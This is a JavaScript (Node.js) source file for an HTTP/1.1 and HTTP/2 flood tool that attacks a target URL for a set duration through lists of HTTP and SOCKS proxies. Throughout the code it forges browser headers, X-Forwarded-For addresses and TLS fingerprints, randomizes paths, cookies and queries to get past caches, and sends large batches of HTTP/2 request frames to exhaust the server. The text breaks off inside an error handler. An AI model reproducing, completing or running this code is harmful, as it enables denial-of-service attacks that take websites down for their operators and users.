const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const colors = require('colors');
const { Command } = require('commander');
const socks = require('socks').SocksClient;
// console.log(headerGenerator.getHeaders())

process.setMaxListeners(0);

process.on('uncaughtException', function (e) {
    // console.log(e)
});
process.on('unhandledRejection', function (e) {
    // console.log(e)
});

const options = new Command();
options
    .option('-m, --method <method>', 'Request method <GET/POST/...>')
    .option('-u, --target <url>', 'Target URL <http/https>')
    .option('-s, --time <seconds>', 'Duration of attack <seconds>', 120)
    .option('-t, --threads <number>', 'Number of threads <int>', 4)
    .option('-r, --rate <rate>', 'Requests per second <int>', 60)

    .option('-p, --proxy <proxy>', 'Proxy file <path>')
    .option('-T, --type <proxytype>', 'Proxy type <http/socks4/socks5>', 'http')
    .option('-d, --debug <debug>', 'Debug mode <true/false>', true)

    .option('-v, --http <version>', 'http version <1/2>', 2)
    .option('--full <full>', 'Full headers <true/false>', false)
    .option('--extra <extra>', 'Extra headers <true/false>', false)
    .option('--delay <delay>', 'Delay between requests <ms>', 10)
    .option('-D, --data <data>', 'Request data <string/RAND>')
    .option('--cache', 'Bypass cache <true/false>', false)
    .option('--close <close>', 'Close bad proxies <true/false>', false)
    .option('--conns <conns>', 'Connection limit <1/10000>')

    .option('-q, --query <query>', 'Generate random query <true/false>', false)
    .option('--randrate <randrate>', 'Random request rate <1-128/60-90>', "")
    .option('--randpath <randpath>', 'Random URL path <true/false>', false)
    .option('--ratelimit <ratelimit>', 'Ratelimit mode <true/false>', false)

    .option('-I, --ip <ip:port>', 'IP address <ipv4>')
    .option('-U, --ua <agent>', 'User-agent header <string>')
    .option('-C, --cookie <cookie>', 'Cookie <string/RAND>')

    .option('-F, --fingerprint <fp>', 'TLS fingerprint <true/false>', false)
    .option('-R, --referer <referer>', 'Referer URL <url/RAND>')

    .option('--checker <checker>', 'Proxy checker', false)

    .option('--config <file>', 'Load configuration <file.json>')

    .parse(process.argv);

    if (options.opts().config && typeof options.opts().config === 'string') {
        try {
            const config_options = fs.readFileSync(options.config, 'utf8');
            const config = JSON.parse(config_options);
            Object.keys(config).forEach(key => {
                if (options[key] !== null && config[key] !== null && config[key] !== false && config[key] !== options.opts()[config[key]]) {
                    options[key] = config[key];
                }
            });
        } catch (error) {
            console.error(`Error loading config: ${error.message}`);
            process.exit(0)
        }
    }



const opts = options.opts();

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

if (!options.opts().method || !options.opts().target || !options.opts().proxy) {
    options.help();
    process.exit(1);
}

// const opts = options.opts();
var reqmethod = opts.method || "GET";
const target = opts.target;
const time = opts.time || 120;
const threads = opts.threads;
const ratelimit = opts.rate || 60;
const proxyfile = opts.proxy;
const proxytype = opts.type;
const debug = opts.debug || false;

const http_opt = parseInt(opts.http) || 2;
const full_headers = opts.full || false;
const extra_headers = opts.extra || false;
const delay_opt = opts.delay || 10;
const data_opt = opts.data || undefined;
const cache_opt = opts.cache;
const close_opt = opts.close;

const query_opt = opts.query || false;
const randrate = opts.randrate;
const randpath = opts.randpath || false;
const ratelimit_opt = opts.ratelimit;

const fingerprint_opt = opts.fingerprint || true;
const referer_opt = opts.referer || false;

const ip_opt = opts.ip || undefined;
const ua_opt = opts.ua || undefined;
const checker = opts.checker || false;
const connections = opts.conns;
var cookie_opt = opts.cookie || undefined;

// const uam_opt = opts.uam || false;

const status_queue = []
let status_codes = {}

const url = new URL(target);
const protocol = url.protocol.replace(":", "");
const port = url.port || (url.protocol === 'https:' ? 443 : 80);

const request_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'RAND']

const SettingHeaderTableSize = 0x1;
const SettingEnablePush = 0x2;
const SettingInitialWindowSize = 0x4;
const SettingMaxHeaderListSize = 0x6;

if (!proxyfile) {
    console.error("Proxy file is missing!");
    process.exit(1);
}

const proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

if (!request_methods.includes(reqmethod)) {
    console.error('Invalid request method!');
    process.exit(1);
}

if (!['http', 'https', 'socks4', 'socks5'].includes(proxytype)) {
    console.error('Invalid proxytype! (http/socks4/socks5)');
    process.exit(1);
}

function random_string(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}


function random_int(minimum, maximum) {
    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
}

function random_cookies() {
    let cookies = "";
    const cookie_names = ["JSESSIONID", "_ga", "PHPSESSID", `_ga_${random_string(random_int(10, 11)).toUpperCase()}`];

    const cookie_limit = random_int(1, cookie_names.length);
    for (var x = 0; x < cookie_limit; x++) {
        const cookie_name = cookie_names[Math.floor(Math.random() * cookie_names.length)];
        const cookie_index = cookie_names.indexOf(cookie_name);
        if (cookie_index > -1) {
            cookie_names.splice(cookie_index, 1);
        }
        const cookie_value = random_string(random_int(random_int(16, 32), random_int(32, 64)));
        cookies += `${cookie_name}=${cookie_value}`;
        if (x+1 < cookie_limit) {
            cookies += '; ';
        }
    }
}

function random_ip() {
    return `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`;
}

const ciphers = [
    "TLS_GREASE",
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
].join(":");

const curves = [
    "X25519",
    "P-256",
    "P-384"
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");

const versions = [
    "TLSv1.3",
    "TLSv1.2"
]

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
];

const encodings = [
    "gzip, deflate, br, zstd",
    "gzip, deflate, br"
]

const ssl_versions = ['771', '772', '773'];
const cipher_suites = ['4865', '4866', '4867', '49195', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];
const elliptic_curves = ['4588', '29', '23', '24'];

class Proxy {
    constructor(host, port, type) {
      this.host = host;
      this.port = parseInt(port);
      this.type = type;
      this.socket = null;
    }

    connect(options = {}) {
      return new Promise((resolve, reject) => {
        if (this.type === 'SOCKS4' || this.type === 'SOCKS5') {
          this.socks(url.hostname, port, options)
            .then(resolve)
            .catch(reject);
        } else if (this.type === 'HTTP' || this.type === 'HTTPS') {
        this.http(options)
          .then(resolve)
          .catch(reject);
        } else {
          reject(new Error('Invalid proxy type'));
        }
      });
    }

    socks(options) {
        return new Promise((resolve, reject) => {
            socks.createConnection({
                proxy: {
                    host: this.host,
                    port: this.port,
                    type: this.type === 'SOCKS5' ? 5 : 4,
                    ...(options.username && options.password && { userId: options.username, password: options.password }),
                },
                command: 'connect',
                destination: { host: url.hostname, port: port },
                timeout: options.timeout || 10000,
            }, (error, info) => {
                if (error) {
                    return reject(new Error(`SOCKS connection error: ${error.message}`));
                }
                this.socket = info.socket;
                resolve(info.socket);
            });
        });
    }

    http(options) {
        return new Promise((resolve, reject) => {
            const socket = net.connect({host: this.host, port: this.port}, () => {
                const request_header = `CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nConnection: Keep-Alive\r\n`;
                const auth_header = options.username && options.password
                    ? `Proxy-Authorization: Basic ${Buffer.from(`${options.username}:${options.password}`).toString('base64')}\r\n`
                    : '';

                socket.write(`${request_header}${auth_header}\r\n`);
            });

            socket.on('data', (data) => {
            const response = data.toString('utf8');
            if (response.includes('HTTP/1.1 200')) {
                this.socket = socket;
                resolve(socket);
            } else {
                socket.destroy();
                reject(new Error(`Bad proxy response: ${response}`));
            }
            });

            socket.on('timeout', () => {
                socket.destroy();
                reject(new Error('Connection timeout'));
            });

            socket.on('error', (err) => {
                socket.destroy();
                reject(new Error(`Connection error: ${err.message}`));
            });

            socket.setTimeout(options.timeout || 10000);
            socket.setKeepAlive(true, 60000);
            socket.setMaxListeners(10 * 10 * 60);
        });
    }

    close() {
        if (this.socket) {
            // console.log(`socket: ${this.socket}, dead ? ${this.socket.destroyed}`);
            this.socket.destroy();
            this.socket.removeAllListeners();
            // console.log(`killed: socket: ${this.socket}, dead ? ${this.socket.destroyed}`);
        }
    }
}

class Http2 {
    constructor(proxy) {
        this.id = 1;
        this.data = Buffer.alloc(0);
        this.hpack = new HPACK();
        // this.hpack.setTableSize(4096);
        this.frames = [];
        this.proxy = proxy;
    }

    static builder() {
        return new Http2();
    }

    encode_frame(streamId, type, payload = "", flags = 0) {
        this.id = streamId;
        let frame = Buffer.alloc(9)
        frame.writeUInt32BE(payload.length << 8 | type, 0)
        frame.writeUInt8(flags, 4)
        frame.writeUInt32BE(streamId, 5)
        if (payload.length > 0)
            frame = Buffer.concat([frame, payload])
        return frame
    }

    decode_frame(data) {
        const length_type = data.readUInt32BE(0)
        const length = length_type >> 8
        const type = length_type & 0xFF
        const flags = data.readUint8(4)
        const streamID = data.readUInt32BE(5)
        const offset = flags & 0x20 ? 5 : 0

        let payload = Buffer.alloc(0)

        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length)

            if (payload.length + offset != length) {
                return null
            }
        }

        return {
            streamID,
            length,
            type,
            flags,
            payload
        }
    }

    encode_settings(settings) {
        const data = Buffer.alloc(6 * settings.length)
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6)
            data.writeUInt32BE(settings[i][1], i * 6 + 2)
        }
        return data
    }
}

class Request {
    constructor(path) {
        this.path = path
        this.headers = [];
    }

    static builder() {
        return new Request();
    }

    set_path(path) {
        this.path = path
    }

    add_header(header, value) {
        const index = this.headers.findIndex(([key]) => key === header);
        if (index !== -1) {
            this.headers[index][1] = value;
        } else {
            this.headers.push([header, value]);
        }
        return this;
    }

    find_header(name) {
        const header = this.headers.find(([k, _]) => k === name);
        return header ? header[1] : null;
    }

    replace_header(k1, v1) {
        const index = this.headers.findIndex(([k, _]) => k === k1);
        if (index !== -1) {
            this.headers[index][1] = v1;
        }
        return this;
    }

    add_headers(headers) {
        for (const [key, value] of Object.entries(headers)) {
            if (value !== null && value !== undefined) {
                this.headers.push([key, value]);
            }
        }
        return this;
    }

    generate_headers() {
        this.headers = [];
        const version = random_int(127, 131);
        var brandValue, versionList, fullVersion;
        switch (version) {
            case 126:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 127:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 128:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 129:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
                break;
            case 130:
                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 131:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"24\"`;
                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                brandValue = `\"Google Chrome\";v=\"${fullVersion}\", \"Chromium\";v=\"${fullVersion}\", \"Not_A Brand\";v=\"24.0.0.0\"`;
            default:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
        }

        const platforms = [
            "Windows NT 10.0; Win64; x64",
            // "Macintosh; Intel Mac OS X 10_15_7",
            // "X11; Linux x86_64",
        ];

        const platform = platforms[Math.floor(Math.random() * platforms.length)];

        var secChUaPlatform, sec_ch_ua_arch, platformVersion;
        switch (platform) {
            case "Windows NT 10.0; Win64; x64":
                secChUaPlatform = "\"Windows\"";
                sec_ch_ua_arch = "x86";
                platformVersion = "\"10.0.0\"";
                break;
            case "Macintosh; Intel Mac OS X 10_15_7":
                secChUaPlatform = "\"macOS\"";
                sec_ch_ua_arch = "arm"
                platformVersion = "\"14.5.0\"";
                break;
            case "X11; Linux x86_64":
                secChUaPlatform = "\"Linux\"";
                sec_ch_ua_arch = "x86"
                platformVersion = "\"5.15.0\"";
                break;
            default:
                secChUaPlatform = "\"Windows\"";
                sec_ch_ua_arch = "x86";
                platformVersion = "\"10.0.0\"";
                break;
        }

        var user_agent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;

        if (ua_opt) {
            user_agent = ua_opt;
        }

        var referer;
        if (referer_opt) {
            const extensions = ['com', 'net', 'org', 'io', 'co', 'gov'];
            const extension = extensions[Math.random(Math.floor() * extensions.length)];
            try {
                if (referer_opt === "RAND") {
                    referer = `https://${random_string(random_int(6, 9))}.${extension}/`;
                } else {
                    const referer_url = new URL(referer_opt);
                    referer = referer_url.href;
                }
            } catch (err) {
                referer = url.href;
            }
        }

        var pathname = this.path;
        if (pathname === "") {
            pathname = "/"
        }

        if (pathname.includes('%RAND%')) {
            // pathname = '/' + random_string(6);
            pathname = pathname.replace("%RAND%", random_string(random_int(6, 9)));
        }

        // console.log(`pathname: ${pathname}`);

        if (randpath) {
            const pathname_length = pathname.length;
            // console.log(`pathname[pathname_length]: ${pathname[pathname_length-1]}, length: ${pathname_length}`);
            if (pathname[pathname_length-1] !== "/") {
                pathname = `${pathname}/${random_string(random_int(6, 9))}`;
            } else {
                pathname = `${pathname}${random_string(random_int(6, 9))}`;
            }
        }

        if (query_opt) {
            pathname = pathname + '?' + random_string(random_int(6, 9))
        }

        // console.log(`final_pathname: ${pathname}`);
        let request_method = reqmethod;
        if (reqmethod === "RAND") {
            request_method = request_methods[Math.floor(Math.random() * request_methods.length)]
        }

        let content_length = 0;
        if (data_opt !== undefined) {
            content_length = Buffer.from(data_opt, 'utf-8').length;
        } else if (data_opt === "RAND") {
            content_length = Buffer.from(random_string(random_int(10, 100)), 'utf-8').length;
        }

        if (cookie_opt === 'RAND') {
            cookie_opt = random_cookies();
        }

        const headers = Object.entries({
            ":method": request_method,
            ":authority": url.hostname,
            ":scheme": "https",
            ":path": pathname
        }).concat(Object.entries({
            // ...(this.id > 1 && Math.random() < 0.40 && { "cache-control": Math.random() < 0.36 ? "max-age=0" : "no-cache" }),
            // ...(Math.random() < 0.50) && { "cache-control": "max-age=0" },
            ...(cache_opt && { "cache-control": Math.random() < 0.50 ? "max-age=0" : "no-cache" }),
            ...(request_method === "POST" && { "content-length": content_length }),
            ...(request_method === "POST" && { "content-type": "application/x-www-form-urlencoded" }),
            "sec-ch-ua": brandValue,
            ...(full_headers && { "sec-ch-ua-arch": sec_ch_ua_arch }),
            ...(full_headers && { "sec-ch-ua-bitness": "\"64\"" }),
            ...(full_headers && { "sec-ch-ua-full-version": fullVersion }),
            ...(full_headers && { "sec-ch-ua-full-version-list": versionList }),
            "sec-ch-ua-mobile": "?0",
            ...(full_headers && { "sec-ch-ua-model": "\"\"" }),
            "sec-ch-ua-platform": secChUaPlatform,
            ...(full_headers && { "sec-ch-ua-platform-version": platformVersion }),
            "upgrade-insecure-requests": "1",
            "user-agent": user_agent,
            // ...(full_headers && Math.random() < 0.36 && { "sec-purpose": "prefetch;prerender" }),
            // ...(full_headers && Math.random() < 0.36 && { "purpose": "prefetch" }),
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "accept-encoding": encodings[~~Math.random(Math.floor() * encodings.length)], //"gzip, deflate, br, zstd",
            "accept-language": languages[~~Math.random(Math.floor() * languages.length)],
            // ...(extra_headers && { "dnt": "true" }),
            // ...(extra_headers && { "x-client-session": "true" }),
            ...(extra_headers && { "x-forwarded-for": Math.random() < 0.36 ? `${random_ip()}, ${this.proxy}` : this.proxy }),
            ...(extra_headers && { "x-forwarded-proto": protocol }),
            ...(extra_headers && { "x-forwarded-scheme": protocol }),
            ...(extra_headers && { "x-real-ip": this.proxy }),
            // ...(extra_headers && Math.random() < 0.5 && { [`x-request-source`]: `"mobile"` }),
            // ...(extra_headers && Math.random() < 0.5 && { [`x-device-id`]: `"device-${Math.floor(Math.random() * 10000)}` }),
            // ...(extra_headers && Math.random() < 0.5 && { [`x-session-token`]: `"session-token-${Math.random().toString(36).substring(2, 15)}"` }),
            "priority": 'u=0, i',
            ...(cookie_opt) && { "cookie": cookie_opt },
            ...(referer) && { "referer": referer},
            // ...(uam_opt) && { "x-forwarded-proto": "https"},
            // ...(uam_opt) && { "x-forwarded-for": `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`}
        })).filter(a => a[1] != null);

        this.add_headers(Object.fromEntries(headers));
        this.order_headers()
        return this;
    }

    update_headers() {
        if (this.path !== undefined && this.path !== url.pathname) {
            this.replace_header(":path", this.path);
        }
        this.order_headers();
        return this;
    }

    remove_header(header) {
        const index = this.headers.findIndex(([header_index, _]) => header_index === header);
        if (index > -1) {
            this.headers.splice(index, 1);
        }
        return this;
    }

    order_headers() {
        const order = [
            ":method",
            ":authority",
            ":scheme",
            ":path",
            "cache-control",
            "content-length",
            "content-type",
            "sec-ch-ua",
            "sec-ch-ua-arch",
            "sec-ch-ua-bitness",
            "sec-ch-ua-full-version",
            "sec-ch-ua-full-version-list",
            "sec-ch-ua-mobile",
            "sec-ch-ua-model",
            "sec-ch-ua-platform",
            "sec-ch-ua-platform-version",
            "upgrade-insecure-requests",
            "user-agent",
            "sec-purpose",
            "purpose",
            "accept",
            "sec-fetch-site",
            "sec-fetch-mode",
            "sec-fetch-user",
            "sec-fetch-dest",
            "accept-encoding",
            "accept-language",
            "priority",
            "cookie",
            "referer",
            "x-forwarded-for",
            "x-forwarded-proto",
            "x-forwarded-scheme"
        ];

        const order_map = new Map(order.map((header, value) => [header, value]));

        this.headers.sort(([header], [index]) => {
            const index1 = order_map.get(header);
            const index2 = order_map.get(index);
            return (index1 !== undefined ? index1 : Infinity) - (index2 !== undefined ? index2 : Infinity);
        });
    }

    build_str() {
        this.remove_header("priority");
        this.add_header("Host", url.hostname);
        let requestStr = `GET ${this.path} HTTP/1.1\r\n`;

        for (const [k, v] of this.headers) {
            if (!k.startsWith(":")) {
                requestStr += `${k}: ${v}\r\n`;
            }
        }

        requestStr += 'Connection: keep-alive\r\n\r\n';
        return requestStr;
    }
}

function rate_range(base) {
    const rate_eq = (base * 50) / 100;
    const min_range = base - rate_eq;
    const max_range = base + rate_eq;

    return {
        min: Math.max(0, min_range),
        max_range
    };
}

function random_fingerprint() {
    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
    const extension = extensions[random_int(0, extensions.length - 1)];
    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];

    const ja3 = `${version},${cipher},${extension},${curve}`;

    return crypto.createHash('md5').update(ja3).digest('hex');
}

const process_rate = () => {
    // console.log(`randrate: ${randrate}`);
    if (randrate === "") {
        rate = ratelimit
    } else if (randrate.includes('-')) {
        let rate_parts = randrate.split('-')
        var minimum, maximum;
        if (rate_parts.length == 2) {
            try {
                minimum = parseInt(rate_parts[0]);
                maximum = parseInt(rate_parts[1]);
                if (minimum > maximum) {
                    rate = random_int(maximum, minimum);
                } else {
                    rate = random_int(minimum, maximum)
                }
                rate = random_int(parseInt(rate_parts[0]), parseInt(rate_parts[1]))
            } catch (err) {
                rate = random_int(1, 90)
            }
        }
    } else if (randrate === "true") {
        rate = random_int(1, 128)
    } else if (randrate !== "") {
        try {
            const base_rate = parseInt(randrate)
            // console.log(`base_rate: ${base_rate}`);
            const range = rate_range(base_rate, 50);
            // console.log(`min: ${rate_range.min}, max: ${rate_range.max}`);
            rate = random_int(range.min, range.max);
        } catch (err) {
            rate = random_int(1, 90)
        }
    }

    return rate
}

const start = async (host, port, proto, options = {}) => {
    // console.log(options)
    const timeout = (duration) => {
        setTimeout(() => {
            start(host, port, proto);
        }, duration);
    }
    // const main_interval = setInterval(async () => {
        // await timeout(Math.random() * 50);
        const proxy = new Proxy(host, port, proto);
        // console.log(`host: ${host}, proxy: ${proxy}`);
        await proxy.connect(options).then(async (socket) => {
            // console.log(`socket: ${socket}`);
            const tls_conn = tls.connect({
                socket: socket,
                ALPNProtocols: http_opt === 1 ? ['http/1.1'] : http_opt === 2 ? ['h2'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: ciphers,
                ...(Math.random() < random_int(0, 75) / 100) ? { sigalgs: sigalgs } : {},
                ecdhCurve: Math.random() < 0.75 ? "X25519" : curves,
                minVersion: versions[versions.length - 1],
                maxVersion: versions[0],
                requestOCSP: Math.random() < 0.50 ? true : false,
                rejectUnauthorized: false,
                ...(fingerprint_opt === true ? { fingerprint: random_fingerprint() } : {}),
            }, async () => {
                // console.log(`(${proto}://${host}:${port}) alpn: ${tls_conn.alpnProtocol}`)
                var request = new Request(url.pathname);
                request.set_path(url.pathname);
                tls_conn.addListener("ratelimit", async (duration) => {
                    // console.log(`${host}:${port} -> ratelimited for ${duration} seconds`);
                    const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
                    const index = proxies.indexOf(proxyKey);
                    if (index > -1) proxies.splice(index, 1);
                    tls_conn.end(() => tls_conn.destroy());
                    await timeout(duration * 1000);
                });
                if (tls_conn.alpnProtocol != 'h2') {
                    tls_conn.on('data', (data) => {
                        const response = data.toString('utf8');
                        // console.log(response)
                        const status_regex = response.match(/HTTP\/1\.1 (\d{3})/);

                        if (status_regex) {
                            const status = parseInt(status_regex[1]);
                            // console.log(`${host}:${port} # HTTP1 : status: ${status}`)
                            status_codes[status] = (status_codes[status] || 0) + 1;

                            if (status == 429 && ratelimit_opt) {
                                tls_conn.emit('ratelimit', 10);
                            }
                        }
                    });

                    const sendHTTP1 = () => {
                        request.generate_headers();
                        const headers = request.build_str();
                        tls_conn.write(headers, (err) => {
                            // console.log(`${host}:${port} # HTTP1 : request sent`)
                            if (!err) {
                                setTimeout(() => {
                                    sendHTTP1()
                                }, 1000 / ratelimit)
                            } else {
                                // console.log(`${host}:${port} # HTTP1 : closed connection`)
                                // status_codes["CLOSE"] = (status_codes["CLOSE"] || 0) + 1;
                                tls_conn.end(() => tls_conn.destroy());
                            }
                        })
                    };

                    sendHTTP1();
                }

                if (http_opt === 1) tls_conn.end(() => tls_conn.destroy());

                var http2 = new Http2(host);
                let streamId = http2.id;

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(15663105, 0);

                http2.frames.push(Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'))

                const settings_frame = http2.encode_frame(0, 0x4, http2.encode_settings([
                    [SettingHeaderTableSize, 65536],
                    [SettingEnablePush, 0],
                    [SettingInitialWindowSize, 6291456],
                    [SettingMaxHeaderListSize, 262144],
                ]));

                http2.frames.push(settings_frame);
                const update_window_frame = http2.encode_frame(0, 0x8, updateWindow);
                http2.frames.push(update_window_frame);

                tls_conn.on('data', async (response) => {
                    http2.data = Buffer.concat([http2.data, response]);
                        while (http2.data.length >= 9) {
                            const frame = http2.decode_frame(http2.data);
                            if (frame != null) {
                                http2.data = http2.data.subarray(frame.length + 9);
                                // console.log(`[${frame.streamID}], Type: [${frame.type}], Flags: [${frame.flags}]`);
                                if (frame.type === 1) {
                                    const headers = http2.hpack.decode(frame.payload);
                                    const statusHeader = headers.find(header => header[0] === ':status');
                                    const cookieHeader = headers.find(header => header[0].toLowerCase() === 'set-cookie');
                                    const redirectHeader = headers.find(header => header[0] === 'location');

                                    if (statusHeader) {
                                        const statusCode = statusHeader[1];

                                        status_codes[statusCode] = (status_codes[statusCode] || 0) + 1;
                                        if (statusCode === "429" && ratelimit_opt) {
                                            //console.log('ratelimited');
                                            const ratelimit_duration = headers.find(header => header[0] === 'retry-after');
                                            //console.log(`ratelimit duration: ${ratelimit_duration[1]}`);
                                            tls_conn.emit("ratelimit", (parseInt(ratelimit_duration[1])));
                                        }

                                        if (['403', '400', '429'].includes(statusCode) && close_opt) {
                                            tls_conn.end(() => tls_conn.destroy());
                                        }
                                    }

                                    if (cookieHeader && cookieHeader[1]) {
                                        const set_cookie = cookieHeader[1];
                                        const current_cookies = request.find_header('cookie');
                                        if (current_cookies) {
                                            request.replace_header('cookie', `${current_cookies}, ${set_cookie}`)
                                        } else {
                                            request.add_header('cookie', set_cookie);
                                        }
                                        const cookie_value = set_cookie.map(cookie => cookie[1].split(';')[0].trim()).join(';');
                                        console.log(`cookieheader: ${set_cookie}`);
                                    }

                                    if (redirectHeader && redirectHeader[1]) {
                                        const redirect_url = new URL(redirectHeader[1], url.href);
                                        const redirect = {
                                            host: redirect_url.host,
                                            path: redirect_url.pathname,
                                            href: redirect_url.href,
                                        }

                                        if (redirect.host && redirect.host !== url.host) request.replace_header(":authority", redirect.host);
                                        if (redirect.path) {
                                            request.set_path(redirect.path);
                                            request.replace_header(":path", redirect.path);
                                        }
                                    }
                                } else if (frame.type == 4 && frame.flags == 0) {
                                    tls_conn.write(http2.encode_frame(0, 0x4, "", 0x1));
                                } else if (frame.type === 7) {
                                    tls_conn.end(() => tls_conn.destroy());
                                    return
                                }
                            } else {
                                break;
                            }
                    }
                });

                tls_conn.write(Buffer.concat(http2.frames));

                const sendHTTP2 = () => {
                    var rate = process_rate();

                    if (tls_conn.destroyed || socket.destroyed) return;

                    const queue = [];

                    for (var x = 0; x < ratelimit; x++) {
                        request.generate_headers()

                        const packed_headers = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            http2.hpack.encode(request.headers)
                        ]);

                        queue.push(http2.encode_frame(streamId, 0x1, packed_headers, 0x1 | 0x4 | 0x20));

                        const data_buffer = data_opt !== undefined ? (data_opt === "RAND" ? Buffer.from(random_string(random_int(10, 100)), 'utf-8') : Buffer.from(data_opt, 'utf-8')) : null;
                        if (data_buffer) queue.push([http2.encode_frame(streamId, 0x0, data_buffer, 0x0)])

                        streamId += 2;
                        http2.id += 2;
                    }

                    tls_conn.write(Buffer.concat(queue), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                sendHTTP2();
                            }, 1000 / (rate));
                        }
                    });
                }
                sendHTTP2();
            }).once('close', () => {
                //console.log(`${host}:${port} TLS connection closed`);
                //clearInterval(main_interval);
                tls_conn.removeAllListeners();
                proxy.close();
                //socket.close(() => socket.destroy());
                return;
            }).once('error', (err) => {
                //console.log(`${host}:${port} TLS error: ${err.message}`);
            }).once('end', () => {
                tls_conn.removeAllListeners();
                proxy.close();
                // console.log(`${host}:${port} TLS connection end`);
                // clearInterval(main_interval);
                // socket.close(() => socket.destroy());
                return;
            });
        }).catch((err) => {
            if (checker) {
